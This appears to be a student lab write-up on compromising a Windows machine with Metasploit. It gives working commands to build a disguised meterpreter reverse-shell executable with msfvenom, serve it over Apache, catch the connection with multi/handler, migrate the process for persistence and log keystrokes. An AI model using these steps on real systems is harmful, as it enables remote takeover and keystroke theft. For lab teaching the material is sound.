# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
![ifconfig](https://github.com/user-attachments/assets/5f9a4e0a-3576-4a38-ac24-bb72980e911a)



Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.228.13 -f exe > fun.exe
## OUTPUT:
![msvenom](https://github.com/user-attachments/assets/7b6d25d9-340c-4e09-9e7c-4a2b4384c59a)

![venom2](https://github.com/user-attachments/assets/c742694c-8da8-49f1-a01b-c8a26deeb60d)



copy the fun.exe into the apache /var/www/html folder
## OUTPUT:

Start apache server
sudo systemctl apache2 start
![sudocpy](https://github.com/user-attachments/assets/b079e79b-6a31-42ce-8c09-1c8e3e85d6dc)


![apache2](https://github.com/user-attachments/assets/377121bc-835b-4c6c-bfc2-3fa63ddd5372)



Invoke msfconsole:
## OUTPUT:

![msfconsole](https://github.com/user-attachments/assets/f8864fa3-0cb3-4608-a4b3-7a43f31be738)


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

![help](https://github.com/user-attachments/assets/6abfc156-8d85-46a8-a82d-a6e321117885)

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit
## OUTPUT:
![keyscan](https://github.com/user-attachments/assets/43c33793-8b0f-4cf3-8084-b4d86a9d68d8)


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads.

![apache server](https://github.com/user-attachments/assets/e6ef1d7c-f590-4ea1-846a-6e0cff0d5921)


Bypass any warning boxes, double-click the file, and allow it to run.
![fun](https://github.com/user-attachments/assets/0d1519b6-111f-43e6-a26c-f6178c2d8787)


On kali give the command exploit

![keyscan](https://github.com/user-attachments/assets/44bc5ff1-fd00-408b-84bc-9eef1e3b6610)


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
![meterpreter](https://github.com/user-attachments/assets/c19605c3-ec1e-4f42-9925-f81bb03e6b54)


The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
![netstat](https://github.com/user-attachments/assets/45b50730-48c6-4fbf-a4f6-6c7885fce3cb)


Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

![notepad](https://github.com/user-attachments/assets/4b639cd3-f26e-4d38-bcb4-4f412b44f6a7)

keyscan_dump	Shows the keystrokes captured so far

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
